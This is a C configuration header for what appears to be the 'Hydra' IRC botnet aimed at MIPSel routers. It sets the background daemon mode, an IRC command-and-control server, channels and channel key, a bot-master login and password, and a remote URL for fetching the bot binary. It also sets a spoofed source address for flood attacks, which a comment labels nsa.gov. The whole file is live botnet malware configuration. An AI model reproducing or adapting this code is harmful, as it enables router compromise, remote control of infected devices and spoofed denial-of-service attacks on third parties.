#ifndef __HYDRA_CONF_H_
#define __HYDRA_CONF_H_

/* daemonize the process (set it in background mode). */
/* BM=yes (debug mode off) BM=no (debug mode on).     */
#define background_mode   "yes"

/* nicknames prefix */
#define irc_nick_prefix   "\\0x0%u" 

/* irc data */

/* hostname of irc server */
#define irc_server    "irc.tiscali.it"
/* port of irc server */
#define irc_port      (6667)
/* irc room where join the bots */
#define irc_room      "#hydra"
/* irc room where the bots show the */
/* vulnerables data (warn: -n room) */
#define irc_room_sv   "#hydra_sv"
/* irc room key */
#define irc_rkey      "jesus"

/* bot master */

/* (login) master hostname */
#define master_host     "!~esaltato@"
/* (login) master password */
#define master_password "hydra"

/* misc */

/* mipsel url reference */
#define hydra_url    "http://your_fucking_url/youfucktard"
/* mipsel precompiled binary tag */
#define hydra_tag    "hydra_mipsel_bin_2008.1"

/* WARNING: router interface */
#define router_ifr   "ppp0"

/* spoofing address for *flood */
/* 12.110.110.204=nsa.gov      */
#define spoof_addr   "12.110.110.204"

#endif
